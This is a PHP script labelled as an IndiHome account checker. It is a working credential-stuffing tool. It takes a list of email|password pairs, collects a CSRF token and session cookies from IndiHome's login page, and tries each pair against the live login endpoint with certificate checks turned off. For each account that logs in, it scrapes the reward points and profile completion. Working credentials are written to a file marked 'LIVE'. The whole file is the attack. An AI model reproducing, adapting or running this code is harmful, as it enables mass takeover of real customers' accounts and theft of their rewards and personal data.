<?php
/*
CHECKER ACCOUNT INDIHOME
CREATED BY ALIF DZIKRI (JEINEL CANNINE )
USAGE php indihome.php y0ur_fcking_list.txt
*/
error_reporting(0);
$colors = new Colors();
//class color
class Colors {
		private $foreground_colors = array();
		private $background_colors = array();
		public function __construct() {
			$this->foreground_colors['black'] = '0;30';
			$this->foreground_colors['dark_gray'] = '1;30';
			$this->foreground_colors['blue'] = '0;34';
			$this->foreground_colors['light_blue'] = '1;34';
			$this->foreground_colors['green'] = '0;32';
			$this->foreground_colors['light_green'] = '1;32';
			$this->foreground_colors['cyan'] = '0;36';
			$this->foreground_colors['light_cyan'] = '1;36';
			$this->foreground_colors['red'] = '0;31';
			$this->foreground_colors['light_red'] = '1;31';
			$this->foreground_colors['purple'] = '0;35';
			$this->foreground_colors['light_purple'] = '1;35';
			$this->foreground_colors['brown'] = '0;33';
			$this->foreground_colors['yellow'] = '1;33';
			$this->foreground_colors['light_gray'] = '0;37';
			$this->foreground_colors['white'] = '1;37';
			$this->background_colors['black'] = '40';
			$this->background_colors['red'] = '41';
			$this->background_colors['green'] = '42';
			$this->background_colors['yellow'] = '43';
			$this->background_colors['blue'] = '44';
			$this->background_colors['magenta'] = '45';
			$this->background_colors['cyan'] = '46';
			$this->background_colors['light_gray'] = '47';
		}
		public function getColoredString($string, $foreground_color = null, $background_color = null) {
			$colored_string = "";
			if (isset($this->foreground_colors[$foreground_color])) {
				$colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
			}
			if (isset($this->background_colors[$background_color])) {
				$colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
			}
			$colored_string .=  $string . "\033[0m";
			return $colored_string;
		}
		public function getForegroundColors() {
			return array_keys($this->foreground_colors);
		}
		public function getBackgroundColors() {
			return array_keys($this->background_colors);
		}
	}
function get_cookie(){
$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0";
$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
$header[] = "Accept-Language: en-US,en";
	$c = curl_init("https://www.indihome.co.id/verifikasi-layanan/cek-email");
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
	curl_setopt($c, CURLOPT_HEADER, TRUE);
	$response = curl_exec($c);
	return $response;
}
function cek($token,$cookie,$em){
$header = array();
$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0";
$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
$header[] = "Accept-Language: en-US,en";
$header[] = 'Cookie: '.$cookie[1][0].'; '.$cookie[1][1].'; '.$cookie[1][2].';';
	$c = curl_init("https://www.indihome.co.id/verifikasi-layanan/login");
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_POSTFIELDS, '_token='.$token[1].'&email='.$em[0].'&password='.$em[1].'');
	curl_setopt($c, CURLOPT_POST, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
	curl_setopt($c, CURLOPT_HEADER, TRUE);
	$response = curl_exec($c);
	return $response;
}
function get_between($string, $start, $end)
{
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
}
function cek_profil($cookie){
$header = array();
$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0";
$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
$header[] = "Accept-Language: en-US,en";
$header[] = 'Cookie: '.$cookie[1][0].'; '.$cookie[1][1].'; '.$cookie[1][2].';';
	$c = curl_init("https://www.indihome.co.id/profile");
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
	curl_setopt($c, CURLOPT_HEADER, TRUE);
	$response = curl_exec($c);
	return $response;
}
function cek_seamless($cookie){
$header = array();
$header[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0";
$header[] = "Accept: text/html,application/xhtml+xml,application/xml";
$header[] = "Accept-Language: en-US,en";
$header[] = 'Cookie: '.$cookie[1][0].'; '.$cookie[1][1].'; '.$cookie[1][2].';';
	$c = curl_init("https://www.indihome.co.id/addon/wifiid-seamless");
	curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_HTTPHEADER, $header);
	curl_setopt($c, CURLOPT_HEADER, TRUE);
	$response = curl_exec($c);
	return $response;
}
$i = 0;
$listcode = $argv[1];
$codelistlist = file_get_contents($listcode);
$code_list_array = file($listcode);
$code = explode(PHP_EOL, $codelistlist);
$count = count($code);
echo "Total : $count Empas \n";
while($i < $count) {
$em = explode("|", $code[$i]);
$email = $em[0];
$pass = $em[1];
$get_cookie = get_cookie();
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $get_cookie, $cookie);
preg_match('/<input type="hidden" name="_token" value="(.*?)">/', $get_cookie, $token);
$cek = cek($token,$cookie,$em);
if(preg_match('/https:\/\/www.indihome.co.id\/assets\/images\/dompet.png/i', $cek)){
	$point=get_between($cek, '<a href="https://www.indihome.co.id/poin">', '</a>');
	$poin = str_replace("\n", "", $point);
	$p = str_replace(" ", "", $poin);
	$berapa = cek_profil($cookie);
	preg_match('/Profil IndiHome <b>(.*?)<\/b><br\/><br\/>/', $berapa, $persen);
	echo $colors->getColoredString("[ $i ] LIVE | ".$email." | ".$pass."| [ Point : ".$p." ] [".$persen[1]."]| ACC : INDIHOME ", "white", "green"). "\n";
	fwrite(fopen("indihome-live.txt", "a"), "LIVE | ".$email."|".$pass."| [ Point : ".$p." ] [".$persen[1]."]| ACC : INDIHOME  \n");
} else{
	echo $colors->getColoredString("[ $i ] DIE | ".$email." | ".$pass." | ACC : INDIHOME ", "black", "red"). "\n";
}$i++;
}
